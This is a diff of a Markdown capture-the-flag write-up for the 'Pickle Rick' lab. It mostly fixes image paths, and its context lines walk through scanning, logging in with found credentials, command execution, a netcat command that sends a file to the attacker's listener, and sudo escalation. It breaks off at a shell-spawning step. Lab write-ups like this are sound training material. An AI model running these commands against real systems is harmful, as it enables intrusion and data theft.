@@ -1,7 +1,6 @@
-
 ---
-title:Pickle Rick
-categories: [Web, Easy ]
+title: Pickle Rick
+categories: [Web, Easy]
 tags: [web, easy, nmap, dirsearch, netcat]
 image: images/Pickle Rick/Pickle Rick.png
 ---
@@ -15,19 +14,19 @@ Scan the target to identify open ports and services:
 ```
 nmap -Pn -sC -sV --min-rate=10000 <targetIP>
 ```
-
+![Pickle-Rick](images/Pickle%20Rick/thm_pickle-rick_2.png)
 **Output**:  
 - **Port 22 (SSH)**: Open, indicating potential SSH access.  
 - **Port 80 (HTTP)**: Open, hosting a web server.
 
 Visiting `http://<targetIP>` reveals a webpage with a challenge to find three "ingredients" (flags).
 
-![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_3.png)
+![Pickle-Rick](images/Pickle%20Rick/thm_pickle-rick_3.png)
 
 ## Step 2: Web Enumeration
 Check the webpage's source code for clues, revealing a username: `R1ckRul3s`.  
 
-![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_4.png)
+![Pickle-Rick](images/Pickle%20Rick/thm_pickle-rick_4.png)
 
 Run a directory scan using *dirsearch*:  
 ```
@@ -38,14 +37,14 @@ dirsearch -u http://<targetIP>
 - `/robots.txt`: Contains `Wubbalubbadubdub`.  
 - `/login.php`: A login page.
 
-![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_5.png)
+![Pickle-Rick](images/Pickle%20Rick/thm_pickle-rick_5.png)
 
 ## Step 3: Gaining Access
 Log in using:  
 - **Username**: `R1ckRul3s`  
 - **Password**: `Wubbalubbadubdub`
 
-![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_6.png)
+![Pickle-Rick](images/Pickle%20Rick/thm_pickle-rick_6.png)
 
 Upon login, a **Command Panel** allows command execution on the server.
 
@@ -57,7 +56,7 @@ http://<targetIP>/Sup3rS3cretPickl3Ingred.txt
 
 This yields the **first ingredient**.
 
-![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_7.png)
+![Pickle-Rick](images/Pickle%20Rick/thm_pickle-rick_7.png)
 
 ## Step 5: Finding the Second Ingredient
 Enumerate `/home/rick` via the Command Panel, finding `second ingredients`. Set up a *netcat* listener on your machine:  
@@ -65,14 +64,14 @@ Enumerate `/home/rick` via the Command Panel, finding `second ingredients`. Set 
 nc -vnlp 9003 > file.txt
 ```
 
-![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_8.png)
+![Pickle-Rick](images/Pickle%20Rick/thm_pickle-rick_8.png)
 
 In the Command Panel, send the file:  
 ```
 /bin/sh | nc <yourIP> 9003 < /home/rick/'second ingredients'
 ```
 
-![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_9.png)
+![Pickle-Rick](images/Pickle%20Rick/thm_pickle-rick_9.png)
 
 Read `file.txt` to obtain the **second ingredient**.
 
@@ -84,14 +83,14 @@ sudo -l
 
 **Output**: The user can run any command with *sudo* without a password.
 
-![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_10.png)
+![Pickle-Rick](images/Pickle%20Rick/thm_pickle-rick_10.png)
 
 Set up a *netcat* listener on your machine:  
 ```
 nc -vnlp 9003
 ```
 
-![Pickle-Rick](../Images/Pickle%20Rick/thm_pickle-rick_11.png)
+![Pickle-Rick](images/Pickle%20Rick/thm_pickle-rick_11.png)
 
 Once connected, spawn an interactive shell:  
 ```
